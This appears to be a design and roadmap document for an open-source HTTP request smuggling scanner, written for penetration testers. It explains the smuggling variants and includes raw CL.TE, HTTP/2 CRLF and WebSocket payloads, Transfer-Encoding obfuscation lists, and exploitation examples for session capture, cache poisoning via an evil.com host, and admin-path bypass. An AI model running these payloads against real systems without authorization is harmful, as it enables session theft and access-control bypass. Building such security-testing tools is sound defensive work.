# HTTP-Smuggler: Advanced HTTP Request Smuggling Detection & Exploitation Tool

## Vision

A world-class, comprehensive HTTP request smuggling detection and exploitation tool that covers **all known smuggling variants** with **100+ payloads**, full domain crawling, and automated exploitation confirmation. Designed to be the go-to tool for security researchers, penetration testers, and bug bounty hunters.

---

## What is HTTP Request Smuggling?

HTTP Request Smuggling exploits discrepancies in how frontend servers (proxies, load balancers, CDNs) and backend servers parse HTTP requests. When these servers disagree on where one request ends and another begins, an attacker can "smuggle" a malicious request that gets processed by the backend but is invisible to the frontend.

### Why It's Critical

- **CVSS 8.1-9.8**: High to Critical severity
- **CWE-444**: Inconsistent Interpretation of HTTP Requests
- **Real-world impact**: Session hijacking, cache poisoning, WAF bypass, credential theft
- **Affects**: AWS ALB, Cloudflare, Akamai, HAProxy, Nginx, Apache, IIS, and more

---

## Supported Smuggling Variants

### Classic HTTP/1.1 Variants

| Variant | Description | Frontend Parses | Backend Parses |
|---------|-------------|-----------------|----------------|
| **CL.TE** | Content-Length vs Transfer-Encoding | Content-Length | Transfer-Encoding |
| **TE.CL** | Transfer-Encoding vs Content-Length | Transfer-Encoding | Content-Length |
| **TE.TE** | Transfer-Encoding obfuscation | One TE variant | Different TE variant |
| **CL.CL** | Duplicate Content-Length headers | First CL | Second CL |
| **CL.0** | Content-Length ignored by backend | Content-Length | Ignores CL |
| **0.CL** | Frontend ignores Content-Length | Ignores CL | Content-Length |

### HTTP/2 Downgrade Variants

| Variant | Description | Attack Vector |
|---------|-------------|---------------|
| **H2.CL** | HTTP/2 to HTTP/1.1 with CL injection | Inject Content-Length in HTTP/2, backend processes as HTTP/1.1 |
| **H2.TE** | HTTP/2 to HTTP/1.1 with TE injection | Inject Transfer-Encoding in HTTP/2 |
| **H2.CRLF** | CRLF injection in HTTP/2 headers | Inject `\r\n` in header values to split requests |
| **H2.0** | HTTP/2 request tunneling | Tunnel complete HTTP/1.1 request in HTTP/2 body |
| **h2c** | HTTP/2 Cleartext upgrade smuggling | Abuse h2c upgrade mechanism |

### WebSocket Smuggling

| Variant | Description | Attack Vector |
|---------|-------------|---------------|
| **WS.Version** | Invalid Sec-WebSocket-Version | Send invalid version (1337, 9999), vulnerable proxies ignore 426 response |
| **WS.Upgrade** | WebSocket upgrade abuse | Exploit proxy tunnel established for WebSocket |

### Advanced Variants

| Variant | Description | Attack Vector |
|---------|-------------|---------------|
| **Pause-Based** | Timing-based desync | Exploit read timeout differences between servers |
| **CSD** | Client-Side Desync | Browser-based request smuggling |

---

## Detection Methodologies

### 1. Timing-Based Detection (Safe)

Send a request that should cause a **timeout** if the backend interprets headers differently.

**CL.TE Timing Payload:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q
```

- If backend uses TE: Waits for chunk terminator `0\r\n\r\n` → **TIMEOUT**
- If backend uses CL: Reads 4 bytes, responds normally → **NO TIMEOUT**

**Timeout indicates potential vulnerability.**

### 2. Differential Response Detection

Send a smuggled request that **poisons** the next request.

**CL.TE Differential Payload:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

Then send a normal request. If the response is for `/404` instead of the requested path, smuggling is confirmed.

### 3. Echo-Based Detection

Smuggle a request to an endpoint that reflects input, then check if the reflection appears in subsequent responses.

---

## Transfer-Encoding Obfuscation (50+ Mutations)

Many servers normalize Transfer-Encoding differently. We test all known obfuscations:

### Capitalization Variants
```
Transfer-Encoding: chunked
transfer-encoding: chunked
TRANSFER-ENCODING: chunked
Transfer-encoding: chunked
tRaNsFeR-eNcOdInG: chunked
```

### Whitespace Variants
```
Transfer-Encoding : chunked          (space before colon)
Transfer-Encoding:  chunked          (double space after colon)
Transfer-Encoding:	chunked          (tab after colon)
Transfer-Encoding:chunked            (no space)
 Transfer-Encoding: chunked          (leading space)
Transfer-Encoding: chunked           (trailing space)
```

### Value Mutations
```
Transfer-Encoding: xchunked
Transfer-Encoding: chunked-false
Transfer-Encoding: chunkedchunked
Transfer-Encoding: chunked, identity
Transfer-Encoding: identity, chunked
Transfer-Encoding: chunked; foo=bar
```

### Newline/CRLF Variants
```
Transfer-Encoding: chunked\r\n\r\n
Transfer-Encoding:\n chunked
Transfer-Encoding: chunked\x00
Transfer-Encoding: chu\x00nked
```

### Duplicate Headers
```
Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding: identity
Transfer-Encoding: chunked
```

### Header Name Variants
```
Transfer_Encoding: chunked           (underscore)
Transfer.Encoding: chunked           (dot)
Transfer\tEncoding: chunked          (tab in name)
```

### Unicode/Encoding Tricks
```
Transfer-Encoding: \u0063hunked
Transfer-Encoding: %63hunked
```

---

## HTTP/2 Attack Vectors

### H2.CL Attack

HTTP/2 doesn't use Content-Length for framing, but when downgraded to HTTP/1.1:

```python
headers = [
    (":method", "POST"),
    (":path", "/"),
    (":authority", "target.com"),
    ("content-length", "50"),  # Injected, used after downgrade
]
body = b"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
```

### H2.CRLF Injection

Inject CRLF in HTTP/2 header values:

```python
headers = [
    (":method", "GET"),
    (":path", "/"),
    ("foo", "bar\r\nTransfer-Encoding: chunked"),  # CRLF injection
]
```

When downgraded, this becomes:
```http
GET / HTTP/1.1
foo: bar
Transfer-Encoding: chunked
```

### H2 Request Tunneling

Abuse CONNECT or other methods to tunnel full HTTP/1.1 requests:

```python
headers = [
    (":method", "CONNECT"),
    (":authority", "target.com:443"),
]
# After tunnel established, send raw HTTP/1.1
```

---

## WebSocket Smuggling

### Sec-WebSocket-Version Attack

```http
GET /socket.io/ HTTP/1.1
Host: target.com
Sec-WebSocket-Version: 1337
Upgrade: websocket
Connection: Upgrade

GET /admin HTTP/1.1
Host: target.com
```

**How it works:**
1. Server returns `426 Upgrade Required` (invalid version)
2. Vulnerable proxies (Varnish, old HAProxy, Envoy) ignore the 426
3. Proxy thinks WebSocket tunnel is established
4. Subsequent data (smuggled request) passes through to backend

**Vulnerable paths to test:**
- `/socket.io/`
- `/ws`
- `/websocket`
- `/graphql-ws`
- `/subscriptions`

---

## Exploitation Capabilities

### 1. Session Hijacking

Smuggle a request that captures the next user's request:

```http
POST /log HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Length: 500

data=
```

The next user's request becomes the body of the smuggled POST to `/log`.

### 2. Cache Poisoning

Smuggle a request that poisons the cache:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

```

Cache stores malicious response for `/static/main.js`.

### 3. ACL/WAF Bypass

Access restricted endpoints by smuggling past the frontend:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

```

Frontend sees `POST /` (allowed), backend processes `GET /admin`.

---

## Architecture

```
http-smuggler/
├── http_smuggler/
│   ├── __init__.py
│   ├── main.py                    # CLI entry point
│   │
│   ├── core/
│   │   ├── __init__.py
│   │   ├── config.py              # Configuration dataclasses
│   │   ├── models.py              # Data models (Endpoint, Result, etc.)
│   │   ├── exceptions.py          # Custom exception hierarchy
│   │   └── engine.py              # Main orchestrator
│   │
│   ├── network/
│   │   ├── __init__.py
│   │   ├── raw_socket.py          # Raw HTTP/1.1 socket client
│   │   └── http2_client.py        # HTTP/2 client using hyperframe
│   │
│   ├── crawler/
│   │   ├── __init__.py
│   │   └── spider.py              # Async domain crawler
│   │
│   ├── detection/
│   │   ├── __init__.py
│   │   ├── protocol.py            # Protocol detection (ALPN, h2c, WS)
│   │   ├── timing.py              # Timing-based detector
│   │   └── differential.py        # Differential response detector
│   │
│   ├── payloads/
│   │   ├── __init__.py
│   │   ├── generator.py           # Base payload generator
│   │   ├── obfuscation.py         # TE obfuscation list (50+)
│   │   │
│   │   ├── classic/
│   │   │   ├── __init__.py
│   │   │   ├── cl_te.py           # CL.TE payloads
│   │   │   ├── te_cl.py           # TE.CL payloads
│   │   │   └── te_te.py           # TE.TE payloads
│   │   │
│   │   ├── http2/
│   │   │   ├── __init__.py
│   │   │   ├── h2_cl.py           # H2.CL payloads
│   │   │   ├── h2_te.py           # H2.TE payloads
│   │   │   └── crlf_injection.py  # HTTP/2 CRLF injection
│   │   │
│   │   ├── websocket/
│   │   │   ├── __init__.py
│   │   │   └── version_smuggle.py # WS version smuggling
│   │   │
│   │   └── advanced/
│   │       ├── __init__.py
│   │       ├── pause_based.py     # Pause-based desync
│   │       └── client_side.py     # Client-side desync
│   │
│   ├── exploits/
│   │   ├── __init__.py
│   │   └── exploit_runner.py      # Exploitation confirmation
│   │
│   ├── analysis/
│   │   ├── __init__.py
│   │   └── reporter.py            # JSON/Markdown report generator
│   │
│   └── utils/
│       ├── __init__.py
│       ├── logging.py             # Logging utilities
│       └── helpers.py             # Common helpers
│
├── tests/
│   ├── __init__.py
│   ├── test_payloads.py
│   ├── test_detection.py
│   └── test_network.py
│
├── payloads/                      # YAML payload definitions
│   ├── cl_te.yaml
│   ├── te_cl.yaml
│   └── http2.yaml
│
├── setup.py
├── requirements.txt
├── README.md
└── info.md                        # This file
```

---

## Implementation Plan

> **Note**: This implementation plan represents the current roadmap. It can be improved or modified if better approaches are identified. Contributions and suggestions for improvements are welcome!

### Complete Task List (24 Tasks)

| # | Task | Priority | Status | File |
|---|------|----------|--------|------|
| 1 | Implement http_smuggler/core/config.py - Configuration classes (ScanConfig, CrawlConfig, SafetyConfig) | HIGH | ✅ Done | core/config.py |
| 2 | Implement http_smuggler/core/exceptions.py - Custom exception hierarchy | HIGH | ✅ Done | core/exceptions.py |
| 3 | Implement http_smuggler/network/raw_socket.py - RawHttpClient for malformed HTTP/1.1 requests | HIGH | ✅ Done | network/raw_socket.py |
| 4 | Implement http_smuggler/detection/protocol.py - ProtocolDetector with ALPN negotiation | HIGH | 🔲 Pending | detection/protocol.py |
| 5 | Implement http_smuggler/payloads/generator.py - Base payload generation framework | HIGH | 🔲 Pending | payloads/generator.py |
| 6 | Implement http_smuggler/payloads/obfuscation.py - 50+ Transfer-Encoding mutations | MEDIUM | 🔲 Pending | payloads/obfuscation.py |
| 7 | Implement http_smuggler/payloads/classic/cl_te.py - CL.TE variant payloads | MEDIUM | 🔲 Pending | payloads/classic/cl_te.py |
| 8 | Implement http_smuggler/payloads/classic/te_cl.py - TE.CL variant payloads | MEDIUM | 🔲 Pending | payloads/classic/te_cl.py |
| 9 | Implement http_smuggler/payloads/classic/te_te.py - TE.TE variant with obfuscations | MEDIUM | 🔲 Pending | payloads/classic/te_te.py |
| 10 | Implement http_smuggler/detection/timing.py - TimingDetector for timeout-based detection | MEDIUM | 🔲 Pending | detection/timing.py |
| 11 | Implement http_smuggler/detection/differential.py - DifferentialDetector for response poisoning | MEDIUM | 🔲 Pending | detection/differential.py |
| 12 | Implement http_smuggler/network/http2_client.py - HTTP2RawClient using hyperframe | MEDIUM | 🔲 Pending | network/http2_client.py |
| 13 | Implement http_smuggler/payloads/http2/h2_cl.py - H2.CL variant payloads | LOW | 🔲 Pending | payloads/http2/h2_cl.py |
| 14 | Implement http_smuggler/payloads/http2/h2_te.py - H2.TE variant payloads | LOW | 🔲 Pending | payloads/http2/h2_te.py |
| 15 | Implement http_smuggler/payloads/http2/crlf_injection.py - HTTP/2 CRLF injection | LOW | 🔲 Pending | payloads/http2/crlf_injection.py |
| 16 | Implement http_smuggler/payloads/websocket/version_smuggle.py - WebSocket smuggling via Sec-WebSocket-Version | LOW | 🔲 Pending | payloads/websocket/version_smuggle.py |
| 17 | Implement http_smuggler/crawler/spider.py - Async domain crawler with endpoint discovery | MEDIUM | 🔲 Pending | crawler/spider.py |
| 18 | Implement http_smuggler/exploits/exploit_runner.py - Exploitation engine for confirmation | MEDIUM | 🔲 Pending | exploits/exploit_runner.py |
| 19 | Implement http_smuggler/analysis/reporter.py - JSON report generator | MEDIUM | 🔲 Pending | analysis/reporter.py |
| 20 | Implement http_smuggler/core/engine.py - Main SmugglerEngine orchestrator | HIGH | 🔲 Pending | core/engine.py |
| 21 | Implement http_smuggler/main.py - CLI interface with Click and Rich | HIGH | 🔲 Pending | main.py |
| 22 | Create tests/ directory with unit tests for core components | LOW | 🔲 Pending | tests/ |
| 23 | Test against PortSwigger Web Security Academy labs | LOW | 🔲 Pending | - |
| 24 | Validate all 100+ payloads and verify no false positives | LOW | 🔲 Pending | - |

---

### Phase 1: Core Infrastructure ✅ PARTIAL

| Task | Status | File |
|------|--------|------|
| Project setup (directories, __init__.py) | ✅ Done | - |
| requirements.txt | ✅ Done | requirements.txt |
| setup.py | ✅ Done | setup.py |
| README.md | ✅ Done | README.md |
| Data models | ✅ Done | core/models.py |
| Configuration classes (Task #1) | ✅ Done | core/config.py |
| Exception hierarchy (Task #2) | ✅ Done | core/exceptions.py |
| Raw socket client (Task #3) | ✅ Done | network/raw_socket.py |

### Phase 2: Network Layer

| Task | Status | File |
|------|--------|------|
| Protocol detector (Task #4) | 🔲 Pending | detection/protocol.py |
| HTTP/2 raw client (Task #12) | 🔲 Pending | network/http2_client.py |

### Phase 3: Payload Generation

| Task | Status | File |
|------|--------|------|
| Base payload generator (Task #5) | 🔲 Pending | payloads/generator.py |
| TE obfuscation list (Task #6) | 🔲 Pending | payloads/obfuscation.py |
| CL.TE payloads (Task #7) | 🔲 Pending | payloads/classic/cl_te.py |
| TE.CL payloads (Task #8) | 🔲 Pending | payloads/classic/te_cl.py |
| TE.TE payloads (Task #9) | 🔲 Pending | payloads/classic/te_te.py |
| H2.CL payloads (Task #13) | 🔲 Pending | payloads/http2/h2_cl.py |
| H2.TE payloads (Task #14) | 🔲 Pending | payloads/http2/h2_te.py |
| H2.CRLF payloads (Task #15) | 🔲 Pending | payloads/http2/crlf_injection.py |
| WebSocket smuggling (Task #16) | 🔲 Pending | payloads/websocket/version_smuggle.py |

### Phase 4: Detection Engine

| Task | Status | File |
|------|--------|------|
| Timing-based detector (Task #10) | 🔲 Pending | detection/timing.py |
| Differential response detector (Task #11) | 🔲 Pending | detection/differential.py |

### Phase 5: Crawling & Discovery

| Task | Status | File |
|------|--------|------|
| Async domain crawler (Task #17) | 🔲 Pending | crawler/spider.py |

### Phase 6: Exploitation & Reporting

| Task | Status | File |
|------|--------|------|
| Exploitation runner (Task #18) | 🔲 Pending | exploits/exploit_runner.py |
| JSON report generator (Task #19) | 🔲 Pending | analysis/reporter.py |

### Phase 7: Integration & CLI

| Task | Status | File |
|------|--------|------|
| Main engine orchestrator (Task #20) | 🔲 Pending | core/engine.py |
| CLI interface (Task #21) | 🔲 Pending | main.py |

### Phase 8: Testing & Validation

| Task | Status | File |
|------|--------|------|
| Unit tests (Task #22) | 🔲 Pending | tests/ |
| PortSwigger lab testing (Task #23) | 🔲 Pending | - |
| Payload validation (Task #24) | 🔲 Pending | - |

---

### Potential Improvements to This Plan

This plan can be enhanced in the following ways:

1. **Additional Payload Variants**: Add support for more obscure smuggling techniques (e.g., request splitting via header injection, HTTP/3 QUIC-based attacks)

2. **WAF Fingerprinting**: Add a module to identify and fingerprint WAFs before testing

3. **Cloud-Specific Payloads**: Specialized payloads for AWS ALB, Cloudflare, Akamai, Fastly, etc.

4. **Burp Suite Integration**: Export findings in Burp-compatible format

5. **CI/CD Integration**: GitHub Actions workflow for automated security testing

6. **Docker Support**: Containerized deployment for consistent testing environments

7. **Plugin Architecture**: Allow community-contributed payload modules

8. **Real-time Dashboard**: Web-based UI for monitoring long-running scans

9. **Collaborative Scanning**: Distributed scanning across multiple nodes

10. **Machine Learning**: ML-based false positive reduction

If you have ideas for improving this implementation plan, please open an issue or submit a PR!

---

## Step-by-Step Implementation Details

### Step 1: Protocol Detection (detection/protocol.py)

Detect supported protocols before testing:

```python
class ProtocolDetector:
    async def detect(self, host: str, port: int) -> ProtocolProfile:
        # 1. ALPN negotiation (check h2, http/1.1)
        # 2. h2c upgrade test
        # 3. WebSocket support check
        # 4. Server/Via header extraction
        return ProtocolProfile(...)
```

Key methods:
- `_negotiate_alpn()`: Use ssl.SSLContext.set_alpn_protocols()
- `_test_h2c_upgrade()`: Send HTTP/1.1 with Upgrade: h2c
- `_test_websocket()`: Send WebSocket handshake
- `_extract_server_info()`: Parse Server, Via, X-Powered-By headers

### Step 2: Payload Generator Framework (payloads/generator.py)

Abstract base for all payload generators:

```python
@dataclass
class Payload:
    name: str
    variant: SmugglingVariant
    raw_request: bytes
    expected_behavior: str
    detection_method: DetectionMethod

class PayloadGenerator(ABC):
    @abstractmethod
    def generate_timing_payloads(self, endpoint: Endpoint) -> List[Payload]: ...
    
    @abstractmethod
    def generate_differential_payloads(self, endpoint: Endpoint) -> List[Payload]: ...
```

### Step 3: CL.TE Payloads (payloads/classic/cl_te.py)

```python
class CLTEPayloadGenerator(PayloadGenerator):
    def generate_timing_payloads(self, endpoint: Endpoint) -> List[Payload]:
        # Timing payload: Backend waits for chunk terminator
        payload = (
            f"POST {endpoint.path} HTTP/1.1\r\n"
            f"Host: {endpoint.host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"Q"  # Incomplete chunk - causes timeout
        )
        return [Payload(name="CL.TE-timing-basic", ...)]
    
    def generate_differential_payloads(self, endpoint: Endpoint) -> List[Payload]:
        # Differential: Smuggle request that poisons next response
        payload = (
            f"POST {endpoint.path} HTTP/1.1\r\n"
            f"Host: {endpoint.host}\r\n"
            f"Content-Length: 35\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"GET /404 HTTP/1.1\r\n"
            f"X-Ignore: X"
        )
        return [Payload(name="CL.TE-differential-404", ...)]
```

### Step 4: TE Obfuscation (payloads/obfuscation.py)

```python
TE_OBFUSCATIONS = [
    # Capitalization
    "Transfer-Encoding: chunked",
    "transfer-encoding: chunked",
    "TRANSFER-ENCODING: chunked",
    "Transfer-encoding: chunked",
    
    # Spacing
    "Transfer-Encoding : chunked",
    "Transfer-Encoding:  chunked",
    "Transfer-Encoding:\tchunked",
    " Transfer-Encoding: chunked",
    
    # Value mutations
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding: chunked-false",
    "Transfer-Encoding: chunked, identity",
    
    # Special characters
    "Transfer-Encoding: chunked\x00",
    "Transfer-Encoding: chu\x00nked",
    
    # ... 50+ more
]

def get_te_mutations() -> List[str]:
    return TE_OBFUSCATIONS
```

### Step 5: Timing Detector (detection/timing.py)

```python
class TimingDetector:
    def __init__(self, config: SafetyConfig):
        self.baseline_timeout = config.timing_detection_timeout
        self.expected_delay = 5.0  # seconds
    
    async def detect(self, client: AsyncRawHttpClient, 
                     payload: Payload) -> DetectionResult:
        # 1. Establish baseline response time
        baseline = await self._get_baseline(client)
        
        # 2. Send timing payload
        start = time.time()
        response = await client.send_and_receive(
            payload.raw_request,
            receive_timeout=self.baseline_timeout
        )
        elapsed = time.time() - start
        
        # 3. Analyze timing
        if elapsed > baseline + self.expected_delay:
            return DetectionResult(
                vulnerable=True,
                confidence=min(0.9, (elapsed - baseline) / self.expected_delay),
                evidence=f"Response delayed by {elapsed - baseline:.2f}s"
            )
        
        return DetectionResult(vulnerable=False, ...)
```

### Step 6: Differential Detector (detection/differential.py)

```python
class DifferentialDetector:
    async def detect(self, client: AsyncRawHttpClient,
                     smuggle_payload: Payload,
                     victim_request: bytes) -> DetectionResult:
        # 1. Send smuggle payload
        await client.send_and_receive(smuggle_payload.raw_request)
        
        # 2. Send victim request on same connection
        victim_response = await client.send_and_receive(victim_request)
        
        # 3. Check for poisoning indicators
        if self._is_poisoned(victim_response):
            return DetectionResult(
                vulnerable=True,
                confidence=0.95,
                evidence=f"Victim received status {victim_response.status_code}"
            )
        
        return DetectionResult(vulnerable=False, ...)
    
    def _is_poisoned(self, response: RawResponse) -> bool:
        # Check for 404, unexpected status, GPOST method error, etc.
        return (
            response.status_code == 404 or
            "GPOST" in response.body.decode(errors="ignore") or
            "unrecognized method" in response.body.decode(errors="ignore").lower()
        )
```

### Step 7: HTTP/2 Client (network/http2_client.py)

Using hyperframe for low-level frame manipulation:

```python
from hyperframe.frame import (
    HeadersFrame, DataFrame, SettingsFrame,
    WindowUpdateFrame, GoAwayFrame
)
from hpack import Encoder, Decoder

class HTTP2RawClient:
    def __init__(self):
        self.encoder = Encoder()
        self.decoder = Decoder()
        self.stream_id = 1
    
    def build_headers_frame(self, headers: List[Tuple[str, str]], 
                            stream_id: int) -> bytes:
        encoded = self.encoder.encode(headers)
        frame = HeadersFrame(stream_id=stream_id)
        frame.data = encoded
        frame.flags.add('END_HEADERS')
        return frame.serialize()
    
    def build_malformed_request(self, headers: List[Tuple[str, str]],
                                 body: bytes) -> bytes:
        # Build HTTP/2 request with injected headers
        # that become smuggling vectors after downgrade
        ...
```

### Step 8: Domain Crawler (crawler/spider.py)

```python
class DomainCrawler:
    def __init__(self, config: CrawlConfig):
        self.config = config
        self.visited: Set[str] = set()
        self.endpoints: List[Endpoint] = []
    
    async def crawl(self, start_url: str) -> List[Endpoint]:
        queue = asyncio.Queue()
        await queue.put((start_url, 0))
        
        async with aiohttp.ClientSession() as session:
            tasks = [
                self._worker(session, queue)
                for _ in range(self.config.concurrent_requests)
            ]
            await asyncio.gather(*tasks)
        
        return self.endpoints
    
    async def _worker(self, session, queue):
        while True:
            url, depth = await queue.get()
            if depth > self.config.max_depth:
                continue
            
            # Fetch and parse
            links = await self._extract_links(session, url)
            for link in links:
                if link not in self.visited:
                    self.visited.add(link)
                    await queue.put((link, depth + 1))
                    self.endpoints.append(Endpoint(url=link))
```

### Step 9: Exploitation Runner (exploits/exploit_runner.py)

```python
class ExploitRunner:
    async def confirm_vulnerability(self, 
                                    detection: DetectionResult,
                                    client: AsyncRawHttpClient) -> ExploitationResult:
        if not detection.vulnerable:
            return ExploitationResult(attempted=False)
        
        # Attempt session capture
        if self.config.attempt_session_capture:
            captured = await self._attempt_session_capture(client, detection)
            if captured:
                return ExploitationResult(
                    attempted=True,
                    successful=True,
                    impact="Session hijacking confirmed",
                    captured_data=captured
                )
        
        # Attempt ACL bypass
        if self.config.attempt_acl_bypass:
            bypassed = await self._attempt_acl_bypass(client, detection)
            if bypassed:
                return ExploitationResult(
                    attempted=True,
                    successful=True,
                    impact="ACL bypass confirmed"
                )
        
        return ExploitationResult(attempted=True, successful=False)
```

### Step 10: Main Engine (core/engine.py)

```python
class SmugglerEngine:
    def __init__(self, config: ScanConfig):
        self.config = config
        self.protocol_detector = ProtocolDetector()
        self.timing_detector = TimingDetector(config.safety)
        self.differential_detector = DifferentialDetector()
        self.payload_generators = self._init_generators()
        self.exploit_runner = ExploitRunner(config.exploit)
    
    async def scan(self, target: str) -> ScanResult:
        # 1. Protocol detection
        profile = await self.protocol_detector.detect(target)
        
        # 2. Crawl (if enabled)
        if not self.config.skip_crawl:
            endpoints = await DomainCrawler(self.config.crawl).crawl(target)
        else:
            endpoints = [Endpoint(url=target)]
        
        # 3. Test each endpoint
        vulnerabilities = []
        for endpoint in endpoints:
            results = await self._test_endpoint(endpoint, profile)
            vulnerabilities.extend(results)
        
        # 4. Generate report
        return ScanResult(
            target=target,
            protocol_profile=profile,
            vulnerabilities=vulnerabilities
        )
    
    async def _test_endpoint(self, endpoint: Endpoint, 
                             profile: ProtocolProfile) -> List[VulnerabilityReport]:
        results = []
        
        # Generate payloads based on protocol
        payloads = self._generate_payloads(endpoint, profile)
        
        # Phase 1: Timing detection (safe)
        for payload in payloads:
            if payload.detection_method == DetectionMethod.TIMING:
                result = await self.timing_detector.detect(payload)
                if result.vulnerable:
                    # Phase 2: Confirm with differential
                    confirmed = await self.differential_detector.detect(...)
                    if confirmed.vulnerable:
                        # Phase 3: Exploitation confirmation
                        exploit = await self.exploit_runner.confirm(...)
                        results.append(VulnerabilityReport(...))
        
        return results
```

### Step 11: CLI Interface (main.py)

```python
import click
from rich.console import Console
from rich.progress import Progress

@click.group()
def cli():
    pass

@cli.command()
@click.argument('target')
@click.option('--mode', type=click.Choice(['safe', 'normal', 'aggressive']))
@click.option('--output', '-o', type=click.Path())
@click.option('--format', type=click.Choice(['json', 'markdown', 'text']))
@click.option('--crawl/--no-crawl', default=True)
@click.option('--exploit/--no-exploit', default=False)
def scan(target, mode, output, format, crawl, exploit):
    """Scan target for HTTP request smuggling vulnerabilities."""
    console = Console()
    
    config = ScanConfig(
        target_url=target,
        mode=ScanMode(mode),
        skip_crawl=not crawl,
        exploit=ExploitConfig(enabled=exploit)
    )
    
    with Progress() as progress:
        task = progress.add_task("Scanning...", total=100)
        
        engine = SmugglerEngine(config)
        result = asyncio.run(engine.scan(target))
        
        progress.update(task, completed=100)
    
    # Output results
    if output:
        with open(output, 'w') as f:
            f.write(result.to_json())
    else:
        console.print_json(result.to_json())

if __name__ == '__main__':
    cli()
```

---

## Usage Examples

### Basic Scan

```bash
http-smuggler scan https://example.com
```

### Full Scan with Exploitation

```bash
http-smuggler scan https://example.com --mode aggressive --exploit --output report.json
```

### HTTP/2 Only

```bash
http-smuggler scan https://example.com --http2-only
```

### Single Endpoint (No Crawling)

```bash
http-smuggler scan https://example.com/api/endpoint --no-crawl
```

### Custom Headers/Cookies

```bash
http-smuggler scan https://example.com \
  --header "Authorization: Bearer token" \
  --cookie "session=abc123"
```

---

## Output Format

### JSON Report Structure

```json
{
  "target": "https://example.com",
  "scan_start": "2025-01-01T00:00:00Z",
  "scan_end": "2025-01-01T00:05:00Z",
  "duration_seconds": 300,
  "protocol": {
    "version": "HTTP/2",
    "alpn": ["h2", "http/1.1"],
    "h2c_supported": false,
    "websocket_supported": true,
    "proxy_detected": true
  },
  "discovery": {
    "endpoints_found": 150,
    "endpoints_tested": 150
  },
  "vulnerabilities": [
    {
      "id": "CL.TE-1234",
      "endpoint": "https://example.com/api/data",
      "variant": "CL.TE",
      "severity": "HIGH",
      "cwe": "CWE-444",
      "cvss_estimate": 8.1,
      "detection": {
        "method": "differential",
        "confidence": 0.95,
        "response_time": 5.2,
        "evidence": "Victim request received 404 response"
      },
      "payload": {
        "raw": "POST /api/data HTTP/1.1\r\n...",
        "description": "CL.TE with basic TE header"
      },
      "exploitation": {
        "attempted": true,
        "successful": true,
        "impact": "Session hijacking confirmed",
        "captured_data": "Cookie: session=..."
      },
      "impact": {
        "summary": "HTTP Request Smuggling enables severe attacks",
        "potential_attacks": {
          "session_hijacking": {"possible": true},
          "cache_poisoning": {"possible": true},
          "access_control_bypass": {"possible": true}
        }
      },
      "remediation": {
        "general": [
          "Use HTTP/2 end-to-end",
          "Disable connection reuse",
          "Normalize request parsing"
        ],
        "priority": "HIGH"
      }
    }
  ],
  "summary": {
    "total_vulnerabilities": 3,
    "critical": 1,
    "high": 2,
    "variants_found": ["CL.TE", "H2.CL"]
  }
}
```

---

## Key Technical Decisions

### Why Raw Sockets?

Standard HTTP libraries (requests, httpx, aiohttp) **normalize and validate** requests:
- Fix header capitalization
- Reject duplicate headers
- Validate Content-Length
- Reject malformed Transfer-Encoding

For smuggling testing, we need to send **exactly what we specify**, including malformed data.

### Why hyperframe for HTTP/2?

The `h2` library validates HTTP/2 headers strictly:
- Rejects duplicate pseudo-headers
- Validates header names
- Enforces HTTP/2 semantics

Using `hyperframe` directly allows us to craft **malformed HTTP/2 frames** for testing.

### Why Timing Before Differential?

1. **Timing is safe**: Doesn't affect other users
2. **Timing is faster**: Single request vs request pair
3. **Reduces false positives**: Only test differential if timing suggests vulnerability
4. **Rate limiting friendly**: Fewer requests overall

### Why Async Architecture?

- **Concurrent endpoint testing**: Test multiple endpoints simultaneously
- **Connection pooling**: Reuse connections for keep-alive testing
- **Timeout handling**: Proper async timeout management
- **Scalability**: Handle large target lists efficiently

---

## Security Considerations

### Safe Mode

- Only timing-based detection
- No impact on other users' sessions
- Suitable for production environments

### Normal Mode

- Timing + differential detection
- Minimal impact (only affects attacker's own requests)
- May trigger WAF alerts

### Aggressive Mode

- Full exploitation confirmation
- May capture other users' data (in controlled environments only)
- **Use only with explicit authorization**

### Rate Limiting

- Configurable requests per second
- Automatic cooldown on WAF detection
- Respect robots.txt by default

---

## Testing Strategy

### Unit Tests

- Payload generation correctness
- Response parsing
- Detection logic

### Integration Tests

- Full scan workflow
- Protocol detection accuracy
- Report generation

### Lab Testing

- PortSwigger Web Security Academy labs
- Local vulnerable containers
- Known vulnerable applications

### False Positive Testing

- Test against non-vulnerable targets
- Verify detection accuracy
- Tune confidence thresholds

---

## References

- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HTTP Desync Attacks (James Kettle)](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [HTTP/2: The Sequel is Always Worse](https://portswigger.net/research/http2)
- [Browser-Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- [defparam/smuggler](https://github.com/defparam/smuggler)
- [BishopFox/h2csmuggler](https://github.com/BishopFox/h2csmuggler)
- [RFC 7230 - HTTP/1.1 Message Syntax](https://tools.ietf.org/html/rfc7230)
- [RFC 7540 - HTTP/2](https://tools.ietf.org/html/rfc7540)

---

## License

MIT License

---

## Contributing

Contributions welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Add tests for new functionality
4. Submit a pull request

Priority areas:
- New smuggling variants
- Additional TE obfuscations
- WAF fingerprinting
- Cloud provider-specific payloads (AWS ALB, Cloudflare, etc.)
